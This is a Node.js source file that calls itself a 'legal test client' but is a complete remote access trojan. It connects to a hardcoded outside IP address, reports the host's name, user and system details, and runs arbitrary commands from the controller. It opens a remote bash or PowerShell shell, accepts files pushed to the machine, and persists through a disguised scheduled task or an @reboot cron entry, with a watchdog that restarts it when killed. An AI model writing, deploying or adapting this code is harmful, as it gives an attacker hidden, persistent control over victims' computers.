
// ===== 合法测试用客户端 v3.0 (防杀+守护) =====
const net = require('net');
const { spawn, exec } = require('child_process');
const os = require('os');
const fs = require('fs');
const path = require('path');

// ---------- 防杀守护机制 ----------
if (!process.argv.includes('--worker')) {
    // 监控进程：无限重启工作进程
    const { spawn } = require('child_process');
    function startWorker() {
        const child = spawn(process.argv[0], [...process.argv.slice(1), '--worker'], {
            stdio: 'inherit',
            detached: false
        });
        child.on('exit', (code) => {
            console.log(`[Monitor] Worker exited with code ${code}, restarting...`);
            setTimeout(startWorker, 2000);
        });
        child.on('error', (err) => {
            console.error('[Monitor] Worker error:', err);
            setTimeout(startWorker, 2000);
        });
    }
    startWorker();
    // 监控进程保持运行
    setInterval(() => {}, 1000);
    // 以下为工作进程代码，不会被执行
} else {
    // ---------- 工作进程主逻辑 ----------
    const CONFIG = {
        host: '149.5.247.123',
        port: 64259,
        reconnectDelay: 5000
    };

    let client = null;
    let isReconnecting = false;
    let fileChunks = new Map();
    let shellProcess = null;

    function getSystemInfo() {
        return {
            arch: os.arch(),
            platform: os.platform(),
            hostname: os.hostname(),
            username: os.userInfo().username,
            cpus: os.cpus().length,
            memory: Math.round(os.totalmem() / (1024 * 1024 * 1024)) + 'GB'
        };
    }

    function executeCommand(cmd, callback) {
        exec(cmd, { timeout: 30000, shell: true, maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
            const result = stdout || stderr || error?.message || '命令执行完成';
            callback(result);
        });
    }

    function executeShellCommand(cmd, client, isComplete) {
        if (!shellProcess) {
            const shell = os.platform() === 'win32' ? 'powershell.exe' : '/bin/bash';
            shellProcess = spawn(shell, [], {
                stdio: ['pipe', 'pipe', 'pipe'],
                shell: false
            });
            shellProcess.stdout.on('data', (data) => {
                client.write(JSON.stringify({
                    type: 'shell_output',
                    data: data.toString(),
                    isComplete: false
                }));
            });
            shellProcess.stderr.on('data', (data) => {
                client.write(JSON.stringify({
                    type: 'shell_output',
                    data: data.toString(),
                    isComplete: false
                }));
            });
            shellProcess.on('exit', (code) => {
                client.write(JSON.stringify({
                    type: 'shell_output',
                    data: `\nShell进程退出 (代码: ${code})\n`,
                    isComplete: true
                }));
                shellProcess = null;
            });
        }
        if (shellProcess && shellProcess.stdin.writable) {
            shellProcess.stdin.write(cmd + '\n');
        }
    }

    function closeShell() {
        if (shellProcess) {
            shellProcess.stdin.end();
            shellProcess = null;
        }
    }

    function connect() {
        if (isReconnecting) return;
        console.log(`🔗 正在连接 ${CONFIG.host}:${CONFIG.port}...`);
        client = net.createConnection({ host: CONFIG.host, port: CONFIG.port }, () => {
            console.log('✅ 已连接到主控端');
            isReconnecting = false;
            client.write(JSON.stringify({
                type: 'info',
                data: getSystemInfo()
            }));
            client.write(JSON.stringify({
                type: 'online',
                timestamp: Date.now()
            }));
        });

        client.on('data', (data) => {
            try {
                const msg = JSON.parse(data.toString());
                handleMessage(msg, client);
            } catch (e) {
                handleRawCommand(data.toString(), client);
            }
        });

        client.on('error', (err) => {
            console.log('❌ 连接错误:', err.message);
            reconnect();
        });

        client.on('close', () => {
            console.log('🔌 连接关闭');
            closeShell();
            reconnect();
        });
    }

    function handleMessage(msg, client) {
        switch(msg.type) {
            case 'cmd':
                executeCommand(msg.command, (result) => {
                    client.write(JSON.stringify({
                        type: 'result',
                        command: msg.command,
                        result: result
                    }));
                });
                break;
            case 'ping':
                client.write(JSON.stringify({ type: 'pong' }));
                break;
            case 'file_start':
                fileChunks.set(msg.filename, {
                    chunks: [],
                    totalChunks: msg.totalChunks,
                    received: 0
                });
                console.log(`📥 开始接收文件: ${msg.filename} (${msg.totalChunks} 分片)`);
                break;
            case 'file_chunk':
                const fileData = fileChunks.get(msg.filename);
                if (fileData) {
                    fileData.chunks.push(msg.chunk);
                    fileData.received++;
                    if (fileData.received % 10 === 0 || fileData.received === fileData.totalChunks) {
                        const progress = Math.round((fileData.received / fileData.totalChunks) * 100);
                        console.log(`📥 接收进度: ${progress}% (${fileData.received}/${fileData.totalChunks})`);
                    }
                    if (fileData.received === fileData.totalChunks) {
                        const fullContent = fileData.chunks.join('');
                        const filePath = path.join(process.cwd(), msg.filename);
                        fs.writeFile(filePath, fullContent, 'base64', (err) => {
                            client.write(JSON.stringify({
                                type: 'file_result',
                                filename: msg.filename,
                                success: !err,
                                error: err ? err.message : null,
                                size: fullContent.length
                            }));
                            fileChunks.delete(msg.filename);
                            console.log(`✅ 文件接收完成: ${msg.filename}`);
                        });
                    }
                }
                break;
            case 'file':
                const filePath = path.join(process.cwd(), msg.filename);
                fs.writeFile(filePath, msg.content, 'base64', (err) => {
                    client.write(JSON.stringify({
                        type: 'file_result',
                        filename: msg.filename,
                        success: !err,
                        error: err ? err.message : null
                    }));
                });
                break;
            case 'shell_start':
                closeShell();
                client.write(JSON.stringify({
                    type: 'shell_ready',
                    message: 'Shell已就绪'
                }));
                break;
            case 'shell_command':
                executeShellCommand(msg.command, client, msg.isComplete || false);
                break;
            case 'shell_close':
                closeShell();
                client.write(JSON.stringify({
                    type: 'shell_closed',
                    message: 'Shell已关闭'
                }));
                break;
        }
    }

    function handleRawCommand(cmd, client) {
        executeCommand(cmd, (result) => {
            client.write(result);
        });
    }

    function reconnect() {
        if (isReconnecting) return;
        isReconnecting = true;
        const time = new Date().toLocaleTimeString();
        console.log(`🔄 [${time}] ${CONFIG.reconnectDelay/1000}秒后重连...`);
        if (client) {
            client.destroy();
            client = null;
        }
        setTimeout(() => {
            isReconnecting = false;
            connect();
        }, CONFIG.reconnectDelay);
    }

    function setupAutoStart() {
        const platform = os.platform();
        const scriptPath = process.argv[1];
        try {
            if (platform === 'win32') {
                const cmd = `schtasks /create /tn "SystemMonitor" /tr "${scriptPath}" /sc onlogon /f`;
                exec(cmd, (err) => {
                    if (!err) console.log('✅ 已添加开机自启动 (Windows)');
                    else console.log('⚠️ 无法添加自启动，请以管理员身份运行');
                });
            } else if (platform === 'linux' || platform === 'darwin') {
                const cmd = `(crontab -l 2>/dev/null | grep -v "${scriptPath}"; echo "@reboot node ${scriptPath}") | crontab -`;
                exec(cmd, (err) => {
                    if (!err) console.log('✅ 已添加开机自启动 (Linux/Mac)');
                    else console.log('⚠️ 无法添加自启动，请以root身份运行');
                });
            }
        } catch (e) {
            console.log('⚠️ 自启动配置失败:', e.message);
        }
    }

    // 主函数
    function main() {
        console.log('🚀 客户端启动中...');
        console.log(`📱 设备名: ${os.hostname()}`);
        setupAutoStart();
        connect();

        process.on('uncaughtException', (err) => {
            console.log('💥 异常:', err.message);
            reconnect();
        });
        process.on('unhandledRejection', (err) => {
            console.log('💥 未处理的Promise异常:', err.message);
        });
    }

    // 执行主逻辑
    main();
}
